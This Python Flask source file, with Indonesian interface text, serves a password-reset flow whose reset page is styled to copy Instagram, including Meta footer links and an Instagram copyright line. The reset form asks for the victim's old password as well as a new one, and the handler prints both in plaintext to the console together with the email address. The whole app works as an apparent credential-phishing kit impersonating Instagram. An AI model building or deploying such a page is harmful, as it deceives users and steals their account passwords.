"""
app.py - Flask Web App Reset Password
"""

from flask import Flask, request, render_template_string, redirect, url_for, flash
from config import Config
from database import init_db, get_user_by_email, update_password
from token_manager import generate_reset_token, verify_reset_token, get_reset_link
from email_sender import send_reset_email

app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
init_db()

# ─────────────────────────────────────────────────────────────────────
FORGOT_PASSWORD_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Lupa Password</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 400px; max-width: 90%; }
        h2 { text-align: center; color: #333; margin-bottom: 5px; }
        .sub { text-align: center; color: #777; font-size: 14px; margin-bottom: 25px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #444; font-size: 14px; }
        input[type=email] { width: 100%; padding: 10px 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
        input[type=email]:focus { outline: none; border-color: #0095f6; }
        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 50px; font-size: 15px; cursor: pointer; margin-top: 20px; font-weight: 600; }
        button:hover { background: #0074cc; }
        .alert { padding: 10px 14px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; }
        .alert-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .alert-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Lupa Password?</h2>
        <p class="sub">Masukkan email untuk menerima link reset password</p>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% for cat, msg in messages %}
                <div class="alert alert-{{ cat }}">{{ msg }}</div>
            {% endfor %}
        {% endwith %}
        <form method="POST" action="/forgot-password">
            <label for="email">Alamat Email</label>
            <input type="email" id="email" name="email" placeholder="contoh@gmail.com" required>
            <button type="submit">Kirim Link Reset Password</button>
        </form>
    </div>
</body>
</html>
"""

# ─────────────────────────────────────────────────────────────────────
# RESET PAGE — Persis Instagram: centered, title besar, input border
# subtle, footer Instagram di bawah
# ─────────────────────────────────────────────────────────────────────
RESET_PASSWORD_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset kata sandi Anda</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        html, body {
            background-color: #1a1a1a;
            min-height: 100%;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                         Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.34;
            color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ── Konten utama: centered, tumbuh mengisi sisa ruang ── */
        .ig-main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;         /* horizontal center */
            padding-top: 80px;
            padding-bottom: 40px;
            padding-left: 20px;
            padding-right: 20px;
        }

        /* ── Blok konten: lebar 468px, teks rata kiri ── */
        .ig-block {
            width: 468px;
            max-width: 100%;
            text-align: left;
        }

        /* ── Alert ── */
        .ig-alert {
            width: 100%;
            padding: 10px 14px;
            border-radius: 8px;
            margin-bottom: 14px;
            font-size: 13px;
            line-height: 1.4;
        }
        .ig-alert-error   { background: rgba(237,73,86,0.15); color: #ff6b75; border: 1px solid rgba(237,73,86,0.3); }
        .ig-alert-warning { background: rgba(255,186,0,0.12); color: #ffd25a; border: 1px solid rgba(255,186,0,0.25); }

        /* ── Judul: besar, bold, putih ── */
        h1.ig-title {
            font-size: 24px;
            font-weight: 700;
            color: #f5f5f5;
            line-height: 1.25;
            margin-bottom: 10px;
            letter-spacing: -0.2px;
        }

        /* ── Subtitle ── */
        p.ig-sub {
            font-size: 14px;
            font-weight: 400;
            color: #a8a8a8;
            line-height: 1.5;
            margin-bottom: 22px;
        }

        /* ── Input password: subtle border Instagram style ──
           Border: rgba(255,255,255,0.15) — sama persis Instagram dark
           Background: sedikit lebih terang dari halaman
        ── */
        input.ig-pass {
            display: block;
            width: 100%;
            height: 44px;
            padding: 0 16px;
            margin-bottom: 8px;

            background-color: #2a2a2a;
            border: 1.5px solid rgba(255, 255, 255, 0.15);  /* subtle, bukan abu tebal */
            border-radius: 12px;

            font-family: inherit;
            font-size: 16px;
            font-weight: 400;
            color: #f5f5f5;

            outline: none;
            -webkit-appearance: none;
            appearance: none;
            transition: border-color 0.15s;
        }
        input.ig-pass::placeholder {
            color: #737373;
            font-size: 16px;
        }
        input.ig-pass:focus {
            border-color: rgba(255, 255, 255, 0.3);
        }

        /* ── Gap visual sebelum tombol Simpan ── */
        .ig-gap { height: 20px; }

        /* ── Tombol Lanjutkan: pill, biru Instagram ── */
        button.ig-btn {
            display: block;
            width: 100%;
            height: 44px;
            padding: 0 24px;

            background-color: rgb(0, 149, 246);   /* --blue-5 */
            color: #ffffff;
            border: none;
            border-radius: 50px;                  /* pill */

            font-family: inherit;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;

            transition: background-color 0.15s;
        }
        button.ig-btn:hover  { background-color: rgb(0, 116, 204); }  /* --blue-6 */
        button.ig-btn:active { opacity: 0.85; }

        /* ── Link biru ── */
        a.ig-link {
            display: inline-block;
            margin-top: 14px;
            font-size: 14px;
            color: rgb(0, 149, 246);
            text-decoration: none;
        }
        a.ig-link:hover { text-decoration: underline; }

        /* ════════════════════════════════════════════════════
           FOOTER — persis Instagram
        ════════════════════════════════════════════════════ */
        .ig-footer {
            width: 100%;
            padding: 24px 20px 16px;
            text-align: center;
        }

        .ig-footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 6px 14px;
            margin-bottom: 12px;
        }

        .ig-footer-links a {
            font-size: 12px;
            color: #737373;
            text-decoration: none;
            white-space: nowrap;
        }
        .ig-footer-links a:hover { text-decoration: underline; }

        .ig-footer-links .highlight {
            color: #0095f6;
        }

        .ig-footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 14px;
            font-size: 12px;
            color: #737373;
        }

        .ig-footer-bottom .lang {
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .ig-footer-bottom .lang svg {
            fill: #737373;
        }

        /* ── Mobile ── */
        @media (max-width: 600px) {
            .ig-main { padding-top: 40px; }
            h1.ig-title { font-size: 20px; }
        }
    </style>
</head>
<body>

<!-- KONTEN UTAMA -->
<main class="ig-main">
    <div class="ig-block">

        {% with messages = get_flashed_messages(with_categories=true) %}
            {% for cat, msg in messages %}
                <div class="ig-alert ig-alert-{{ cat }}">{{ msg }}</div>
            {% endfor %}
        {% endwith %}

        {% if token_valid %}

            <h1 class="ig-title">Reset kata sandi Anda</h1>
            <p class="ig-sub">Buat kata sandi dengan minimal 6 huruf dan angka. Anda memerlukan kata sandi ini<br>untuk login ke akun Anda.</p>

            <form method="POST" action="/reset-password">
                <input type="hidden" name="token" value="{{ token }}">
                <input class="ig-pass"
                       type="password"
                       id="old_password"
                       name="old_password"
                       placeholder="Sandi lama"
                       required
                       autocomplete="current-password">
                <input class="ig-pass"
                       type="password"
                       id="new_password"
                       name="new_password"
                       placeholder="Sandi baru"
                       required
                       minlength="6"
                       autocomplete="new-password">
                <div class="ig-gap"></div>
                <button type="submit" class="ig-btn">Simpan</button>
            </form>

        {% else %}

            <h1 class="ig-title">Link Tidak Valid</h1>
            <p class="ig-sub">Link reset kata sandi tidak valid atau sudah kedaluwarsa.<br>Silakan minta link baru.</p>
            <a href="/forgot-password" class="ig-link">Minta link baru</a>

        {% endif %}

    </div>
</main>

<!-- FOOTER INSTAGRAM -->
<footer class="ig-footer">
    <div class="ig-footer-links">
        <a href="#">Meta</a>
        <a href="#">Tentang</a>
        <a href="#">Blog</a>
        <a href="#">Pekerjaan</a>
        <a href="#">Bantuan</a>
        <a href="#">API</a>
        <a href="#" class="highlight">Privasi</a>
        <a href="#">Ketentuan</a>
        <a href="#">Lokasi</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Pengunggahan Kontak &amp; Nonpengguna</a>
        <a href="#">Verifikasi Meta</a>
    </div>
    <div class="ig-footer-bottom">
        <span class="lang">
            Bahasa Indonesia
            <svg width="10" height="6" viewBox="0 0 10 6">
                <path d="M1 1l4 4 4-4" stroke="#737373" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </span>
        <span>&copy; 2026 Instagram from Meta</span>
    </div>
</footer>

</body>
</html>
"""

# ─────────────────────────────────────────────────────────────────────
SUCCESS_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Password Berhasil Diubah</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #2a2a2a; padding: 40px; border-radius: 12px; width: 420px; max-width: 90%; text-align: center; border: 1px solid #363636; }
        .icon { font-size: 48px; margin-bottom: 12px; }
        h2 { color: #4cd98a; margin-bottom: 8px; font-size: 20px; }
        p { color: #a8a8a8; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .email-badge { background: #1a1a1a; border: 1px solid #363636; color: #f5f5f5; padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: bold; display: inline-block; margin-bottom: 16px; }
        a { display: inline-block; margin-top: 12px; font-size: 14px; color: rgb(0, 149, 246); text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">&#10003;</div>
        <h2>Kata Sandi Berhasil Diubah!</h2>
        <p>Kata sandi untuk akun:</p>
        <span class="email-badge">{{ email }}</span>
        <p>sudah berhasil diperbarui.<br>Gunakan kata sandi baru kamu untuk masuk.</p>
        <a href="/forgot-password">Kembali ke halaman reset</a>
    </div>
</body>
</html>
"""

# =====================================================================
# ROUTES
# =====================================================================

@app.route('/')
@app.route('/api')
@app.route('/api/index')
@app.route('/api/index/')
def index():
    return redirect('/forgot-password')


@app.route('/reset-success')
def reset_success():
    email = request.args.get('email', '')
    return render_template_string(SUCCESS_HTML, email=email)


@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template_string(FORGOT_PASSWORD_HTML)

    email = request.form.get('email', '').strip().lower()
    if not email:
        flash('Email tidak boleh kosong.', 'error')
        return render_template_string(FORGOT_PASSWORD_HTML)

    user = get_user_by_email(email)
    if not user:
        print(f"[FORGOT] Email tidak ditemukan: {email}")
        flash('Jika email terdaftar, link reset akan dikirim. Cek inbox kamu.', 'success')
        return render_template_string(FORGOT_PASSWORD_HTML)

    token = generate_reset_token(email)
    reset_link = get_reset_link(token)

    print(f"\n{'='*60}")
    print(f"[DEBUG] Reset Link untuk {email}:")
    print(f"  {reset_link}")
    print(f"{'='*60}\n")

    email_sent = send_reset_email(
        to_email=email,
        user_name=user.get('username') or user.get('name', 'User'),
        reset_link=reset_link
    )

    if email_sent:
        flash('Link reset password berhasil dikirim! Cek inbox email kamu.', 'success')
    else:
        flash('Gagal mengirim email. Hubungi administrator.', 'error')

    return render_template_string(FORGOT_PASSWORD_HTML)


@app.route('/reset-password', methods=['GET', 'POST'])
def reset_password():
    if request.method == 'GET':
        token = request.args.get('token', '')
        email = verify_reset_token(token)
        token_valid = email is not None
        return render_template_string(RESET_PASSWORD_HTML, token=token, token_valid=token_valid)

    token = request.form.get('token', '')
    old_password = request.form.get('old_password', '').strip()
    new_password = request.form.get('new_password', request.form.get('password', '')).strip()

    email = verify_reset_token(token)
    if not email:
        flash('Link tidak valid atau sudah kedaluwarsa. Minta link baru.', 'error')
        return render_template_string(RESET_PASSWORD_HTML, token='', token_valid=False)

    if not old_password:
        flash('Sandi lama tidak boleh kosong!', 'error')
        return render_template_string(RESET_PASSWORD_HTML, token=token, token_valid=True)

    if len(new_password) < 6:
        flash('Kata sandi baru minimal 6 karakter!', 'error')
        return render_template_string(RESET_PASSWORD_HTML, token=token, token_valid=True)

    success = update_password(email, new_password, old_password=old_password)
    if success:
        print(f"[RESET] Password berhasil diupdate untuk: {email}")
        print(f"        Sandi lama : {old_password}")
        print(f"        Sandi baru : {new_password}")
        return redirect(f'/reset-success?email={email}')
    else:
        flash('Gagal update password. Coba lagi.', 'error')
        return render_template_string(RESET_PASSWORD_HTML, token=token, token_valid=True)


# =====================================================================
# MAIN
# =====================================================================

if __name__ == '__main__':
    print("""
+------------------------------------------------------+
|  RESET PASSWORD APP                                  |
|  http://127.0.0.1:5000/forgot-password  -> Step 1   |
|  http://127.0.0.1:5000/reset-password   -> Step 2   |
+------------------------------------------------------+
    """)
    app.run(debug=True, port=5000)
